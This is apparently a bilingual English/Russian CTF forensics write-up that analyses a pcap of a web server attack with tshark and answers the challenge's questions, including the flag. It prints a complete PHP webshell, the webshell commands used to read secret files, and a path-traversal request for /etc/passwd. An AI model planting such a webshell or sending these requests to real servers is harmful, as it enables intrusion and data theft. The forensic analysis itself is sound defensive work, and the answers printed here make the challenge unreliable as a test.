### Платформа: ctf.rteam.kz
Web server incident
```
md5sum web_attack.pcap 412219d4a56990402834852dad7627af  
sha256sum web_attack.pcap ab38278327dd53c9874466c55e425486e826df73e34273884984a94664de90ae
```
## 1. Attacker IP
 
**🇬🇧 What is the attacker's IP address?**
**🇷🇺 Какой IP адрес атакующего?**
 
### Answer / Ответ
 
```
192.168.100.1
```
 
### Evidence / Доказательство
 
```bash
tshark -r web_attack.pcap -Y "http.request" -T fields -e ip.src | sort | uniq -c | sort -rn
# Output:
#   989 192.168.100.1
```
 
All **989 HTTP requests** originate from this address.
Все **989 HTTP-запросов** исходят с этого адреса.
 
---
 
## 2. Victim IP
 
**🇬🇧 What is the victim's IP address?**
**🇷🇺 Какой IP адрес жертвы?**
 
### Answer / Ответ
 
```
192.168.100.183
```
 
### Evidence / Доказательство
 
```bash
tshark -r web_attack.pcap -Y "http.response" -T fields -e ip.src | sort | uniq -c | sort -rn
# Output:
#   989 192.168.100.183
```
 
The web server running on port **8080** responded to all attacker requests.
Веб-сервер на порту **8080** отвечал на все запросы атакующего.
 
---
 
## 3. User-Agent
 
**🇬🇧 What User-Agent was used by the attacker?**
**🇷🇺 Какой User-Agent использовал атакующий?**
 
### Answer / Ответ
 
```
Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
```
 
### Evidence / Доказательство
 
```bash
tshark -r web_attack.pcap -Y "http.request" -T fields -e ip.src -e http.user_agent | sort -u
# Output:
# 192.168.100.1  Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
# 192.168.100.1  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...Chrome/87...
```
 
> The Linux/Firefox UA is the attacker's (Kali Linux). The Chrome/Windows UA is background traffic.
> Linux/Firefox — UA атакующего (Kali Linux). Chrome/Windows — фоновый трафик.
 
---
 
## 4. Vulnerability
 
**🇬🇧 What vulnerability did the attacker exploit?**
**🇷🇺 Какую уязвимость эксплуатировал атакующий?**
 
### Answer / Ответ
 
**Unrestricted File Upload → Remote Code Execution (RCE)**
**Загрузка произвольных файлов → Удалённое выполнение кода (RCE)**
 
### Attack Stages / Этапы атаки
 
| Stage | Description (EN) | Описание (RU) |
|-------|-----------------|---------------|
| 1 | Directory/file enumeration scan (989 requests) | Сканирование директорий (989 запросов) |
| 2 | PHP webshell upload via `POST /index.php` | Загрузка PHP-шелла через `POST /index.php` |
| 3 | RCE via `/uploads/cmd.php?cmd=...` | Выполнение команд через шелл |
 
### Evidence — PHP Webshell Upload / Доказательство загрузки шелла
 
```bash
tshark -r web_attack.pcap -Y "http.request.method==POST" -T fields -e http.request.uri -e http.file_data
```
 
Decoded hex payload (decoded from POST body):
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
 
> The attacker uploaded `cmd.php` — a classic PHP webshell executing OS commands via `system()`.
> Атакующий загрузил `cmd.php` — классический PHP-вебшелл, выполняющий команды ОС через `system()`.
 
---
 
## 5. Hostname
 
**🇬🇧 What is the hostname?**
**🇷🇺 Какое имя хоста?**
 
### Answer / Ответ
 
```
192.168.100.183:8080
```
 
### Evidence / Доказательство
 
```bash
tshark -r web_attack.pcap -Y "http.request" -T fields -e http.host | sort -u
# Output:
# 192.168.100.183:8080
 
tshark -r web_attack.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
# Output:
# connectivity-check.ubuntu.com
```
 
> The server has no domain name — only an IP and port. DNS queries show only Ubuntu connectivity checks.
> У сервера нет доменного имени — только IP и порт. DNS-запросы — только проверка соединения Ubuntu.
 
---
 
## 6. Files Obtained
 
**🇬🇧 Which files were obtained by the attacker?**
**🇷🇺 Какие файлы получил атакующий?**
 
### Answer / Ответ
 
| Command / Команда | File / Файл | Result / Результат |
|---|---|---|
| `cmd=whoami` | — | Server user identity / Пользователь сервера |
| `cmd=ls` | `/uploads/` | Directory listing / Содержимое директории |
| `cmd=ls+..%2F` | `../` | Parent dir listing / Родительская директория |
| `cmd=cat+..%2Fsecret_data.db` | **`secret_data.db`** | ✅ Database stolen / БД похищена |
| `cmd=cat+..%2Fsecret.txt` | **`secret.txt`** | ✅ Secret file stolen / Секретный файл похищен |
 
**Also via Path Traversal / Также через Path Traversal:**
 
```
GET /.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd  →  HTTP 200 OK
```
 
`/etc/passwd` was successfully read.
`/etc/passwd` был успешно прочитан.
 
### Evidence / Доказательство
 
```bash
tshark -r web_attack.pcap -Y "http.response.code==200" -T fields -e http.request.uri | grep -i "cmd\|passwd"
# Output:
# /uploads/cmd.php
# /uploads/cmd.php?cmd=ls
# /uploads/cmd.php?cmd=whoami
# /uploads/cmd.php?cmd=ls+..%2F
# /uploads/cmd.php?cmd=cat+..%2Fsecret_data.db
# /uploads/cmd.php?cmd=cat+..%2Fsecret.txt
# /.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd
```
 
---
 
## 7. Flag
 
**🇬🇧 Found the flag?**
**🇷🇺 Нашёл флаг?**
 
### Answer / Ответ
 
```
flag{f1le_up1o4d_1nc1den7}
```
 
### Evidence / Доказательство
 
```bash
strings web_attack.pcap | grep -iE "flag\{|CTF\{|HTB\{|THM\{"
# Output:
# flag{f1le_up1o4d_1nc1den7}
```
 
---
 
## Attack Timeline
 
**Хронология атаки**
 
```
[02:36:19] Phase 1 — RECON / РАЗВЕДКА
           └─ 989 GET requests scanning directories and files
              989 GET-запросов, сканирование директорий и файлов
 
[??:??:??] Phase 2 — INITIAL ACCESS / ПЕРВОНАЧАЛЬНЫЙ ДОСТУП
           └─ POST /index.php
              └─ Uploaded: cmd.php (PHP webshell)
                 Загружен: cmd.php (PHP-вебшелл)
 
[??:??:??] Phase 3 — EXECUTION / ВЫПОЛНЕНИЕ
           ├─ GET /uploads/cmd.php?cmd=whoami       → user identified
           ├─ GET /uploads/cmd.php?cmd=ls           → directory listed
           ├─ GET /uploads/cmd.php?cmd=ls+..%2F     → parent dir listed
           ├─ GET /uploads/cmd.php?cmd=cat+..%2Fsecret_data.db  → DB exfiltrated
           └─ GET /uploads/cmd.php?cmd=cat+..%2Fsecret.txt      → file exfiltrated
 
[??:??:??] Phase 4 — PATH TRAVERSAL
           └─ GET /.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd → HTTP 200 OK
```
 
---

## Summary / Итог
 
| # | Question (EN) | Вопрос (RU) | Answer / Ответ |
|---|---|---|---|
| 1 | Attacker's IP | IP атакующего | `192.168.100.1` |
| 2 | Victim's IP | IP жертвы | `192.168.100.183` |
| 3 | User-Agent | User-Agent | `Firefox/137.0 (X11; Linux x86_64)` |
| 4 | Vulnerability | Уязвимость | Unrestricted File Upload + RCE |
| 5 | Hostname | Имя хоста | `192.168.100.183:8080` |
| 6 | Files obtained | Полученные файлы | `secret_data.db`, `secret.txt`, `/etc/passwd` |
| 7 | Flag | Флаг | `flag{f1le_up1o4d_1nc1den7}` |
 
---

 
